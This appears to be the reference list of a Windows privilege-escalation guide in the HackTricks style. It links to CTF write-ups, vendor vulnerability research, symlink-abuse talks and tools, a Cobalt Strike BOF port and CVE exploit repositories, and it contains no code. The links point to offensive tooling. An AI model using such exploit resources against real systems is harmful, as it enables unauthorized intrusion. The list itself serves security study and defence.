- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)

{{#include ../../banners/hacktricks-training.md}}
